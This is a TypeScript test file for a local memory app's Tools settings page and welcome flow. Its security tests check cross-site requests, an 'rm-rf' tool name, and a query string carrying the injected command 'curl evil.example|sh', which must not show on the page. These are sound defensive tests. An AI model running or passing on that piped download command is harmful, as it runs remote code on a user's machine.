/** The Mac app's pages (D3): Settings › Tools on this Mac, and the welcome. Fake HOME and tools only. */
import { test, type TestContext } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { request } from 'node:http';
import { fakeHome } from '../testing/fakeTools.js';
import { startTestApp } from '../testing/helpers.js';

async function start(t: TestContext, opts: { localMode?: boolean } = { localMode: true }) {
  const f = fakeHome();
  t.after(() => f.cleanup());
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-status-'));
  const app = await startTestApp({ localMode: opts.localMode, noPassword: true, statusDir, tools: { home: f.home, path: `${f.bin}:${dirname(process.execPath)}:/usr/bin:/bin`, apps: f.apps } });
  t.after(() => app.close());
  return { app, f };
}

/** A page load as a browser sends it, signed in by local mode; returns the body and the session cookie. */
function openPage(baseUrl: string, path: string, cookie = ''): Promise<{ status: number; body: string; cookie: string; location?: string }> {
  const u = new URL(baseUrl);
  return new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port: u.port, path, method: 'GET', setHost: false, headers: { Host: `localhost:${u.port}`, 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', ...(cookie ? { Cookie: cookie } : {}) } }, (res) => {
      let body = '';
      res.on('data', (c) => { body += c; });
      res.on('end', () => {
        const set = res.headers['set-cookie'] ?? [];
        resolve({ status: res.statusCode ?? 0, body, cookie: cookie || set.map((c) => c.split(';')[0]).join('; '), location: res.headers.location });
      });
    });
    req.on('error', reject);
    req.end();
  });
}
const post = (baseUrl: string, path: string, cookie: string, body: Record<string, string> = {}, origin = baseUrl) =>
  fetch(baseUrl + path, { method: 'POST', redirect: 'manual', headers: { Cookie: cookie, Origin: origin, 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams(body) });

test('Settings › Tools on this Mac lists the tools and connects and disconnects them', async (t) => {
  const { app, f } = await start(t);
  const settings = await openPage(app.baseUrl, '/settings');
  assert.match(settings.body, /<a[^>]*href="\/settings\/tools"[^>]*>[\s\S]*Tools on this Mac/);
  const page = await openPage(app.baseUrl, '/settings/tools', settings.cookie);
  assert.equal(page.status, 200);
  for (const name of ['Claude Code', 'Codex', 'OpenCode', 'Cursor']) assert.match(page.body, new RegExp(name));
  assert.match(page.body, /action="\/settings\/tools\/claude-code\/connect"/);
  const r = await post(app.baseUrl, '/settings/tools/claude-code/connect', settings.cookie);
  assert.equal(r.status, 303);
  assert.equal(r.headers.get('location'), '/settings/tools?tool=claude-code');
  assert.deepEqual(f.servers('claude'), { brainai: `${app.baseUrl}/mcp` });
  const after = await openPage(app.baseUrl, r.headers.get('location')!, settings.cookie);
  assert.match(after.body, /\/mcp, choose brainai and Authenticate/, 'the next step is said');
  assert.match(after.body, /action="\/settings\/tools\/claude-code\/disconnect"/);
  assert.equal((await post(app.baseUrl, '/settings/tools/claude-code/disconnect', settings.cookie)).status, 303);
  assert.deepEqual(f.servers('claude'), {});
});

test('another site cannot connect a tool, an unknown tool is 404, and none of it exists outside local mode', async (t) => {
  const { app, f } = await start(t);
  const s = await openPage(app.baseUrl, '/settings');
  assert.equal((await post(app.baseUrl, '/settings/tools/claude-code/connect', s.cookie, {}, 'https://attacker.example')).status, 403);
  assert.equal((await post(app.baseUrl, '/settings/tools/rm-rf/connect', s.cookie)).status, 404);
  assert.deepEqual(f.calls().filter((c) => c.includes(' add ')), []);
  const server = await start(t, { localMode: false });
  const res = await fetch(server.app.baseUrl + '/settings/tools', { redirect: 'manual' });
  assert.ok([302, 404].includes(res.status));
  const unknown = await fetch(server.app.baseUrl + '/no-such-page', { redirect: 'manual' });
  assert.equal(res.status === 302 ? 302 : unknown.status, res.status);
});

const ai = { type: 'ai', name: 'Claude Code' } as const;

test('a new Mac install opens on the welcome, and once it is done it never comes back by itself', async (t) => {
  const { app } = await start(t);
  const home = await openPage(app.baseUrl, '/');
  assert.equal(home.status, 302);
  assert.equal(home.location, '/welcome');
  const w1 = await openPage(app.baseUrl, '/welcome', home.cookie);
  assert.match(w1.body, /Your brain is running/);
  assert.match(w1.body, /action="\/welcome\/name"/);
  const named = await post(app.baseUrl, '/welcome/name', home.cookie, { name: 'Alex' });
  assert.equal(named.headers.get('location'), '/welcome?step=2');
  assert.deepEqual(app.deps.service.loadProfile().map((m) => m.content), ['The owner is called Alex.']);
  // An empty name saves nothing.
  await post(app.baseUrl, '/welcome/name', home.cookie, { name: '  ' });
  assert.equal(app.deps.service.loadProfile().length, 1);
  const w2 = await openPage(app.baseUrl, '/welcome?step=2', home.cookie);
  assert.match(w2.body, /Claude Code/);
  assert.match(w2.body, /<input type="hidden" name="back" value="welcome">/, 'Connect returns to the welcome');
  const w3 = await openPage(app.baseUrl, '/welcome?step=3', home.cookie);
  assert.match(w3.body, /data-setup-status="\/welcome\/first"/);
  const done = await post(app.baseUrl, '/welcome/done', home.cookie);
  assert.equal(done.headers.get('location'), '/');
  assert.equal((await openPage(app.baseUrl, '/', home.cookie)).status, 200, 'done sticks');
});

test('the welcome waits for the first memory or suggestion an assistant saves', async (t) => {
  const { app } = await start(t);
  const s = await openPage(app.baseUrl, '/');
  const first = async () => (await fetch(app.baseUrl + '/welcome/first', { headers: { Cookie: s.cookie } })).text();
  assert.match(await first(), /Waiting for your first memory/);
  await app.deps.service.remember({ kind: 'profile', content: 'Prefers short answers.' }, ai);
  assert.match(await first(), /Claude Code suggested: Prefers short answers\. It waits for your approval on Projects\./);
  await app.deps.service.remember({ kind: 'decision', content: 'The garden site uses SQLite.', project: 'garden-site' }, ai);
  assert.match(await first(), /Saved by Claude Code: The garden site uses SQLite\./);
});

test('the welcome does not interrupt a brain in use, and never exists outside local mode', async (t) => {
  const { app } = await start(t);
  await app.deps.service.remember({ kind: 'decision', content: 'Something already saved.', project: 'p' }, ai);
  assert.equal((await openPage(app.baseUrl, '/')).status, 200);
  const server = await start(t, { localMode: false });
  const unknown = await fetch(server.app.baseUrl + '/no-such-page', { redirect: 'manual' });
  const w = await fetch(server.app.baseUrl + '/welcome', { redirect: 'manual' });
  assert.ok([unknown.status, 302].includes(w.status));
});

test('another site cannot make the Tools page or the welcome say anything: only the last real result shows', async (t) => {
  const { app } = await start(t);
  const s = await openPage(app.baseUrl, '/settings');
  for (const path of ['/settings/tools?said=BrainAI+needs+you+to+run+curl+evil.example%7Csh', '/settings/tools?tool=codex', '/welcome?step=2&said=Run+this+command']) {
    const p = await openPage(app.baseUrl, path, s.cookie);
    assert.doesNotMatch(p.body, /curl evil|Run this command|role="status"/, path);
  }
});

test('on Windows the desktop pages say "this computer", never "this Mac"', async (t) => {
  const f = fakeHome();
  t.after(() => f.cleanup());
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-win-words-'));
  const app = await startTestApp({ localMode: true, noPassword: true, statusDir, tools: { platform: 'win32', home: f.home, path: f.bin, apps: f.apps } });
  t.after(() => app.close());
  const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
  for (const path of ['/settings', '/settings/tools', '/settings/move', '/settings/reach', '/welcome']) {
    const page = await openPage(app.baseUrl, path, cookie);
    assert.doesNotMatch(page.body, /this Mac|on the Mac/i, path);
    assert.doesNotMatch(page.body, /\$\{/, `${path}: no template text left in the page`);
  }
  assert.match((await openPage(app.baseUrl, '/settings/tools', cookie)).body, /Tools on this computer/);
});
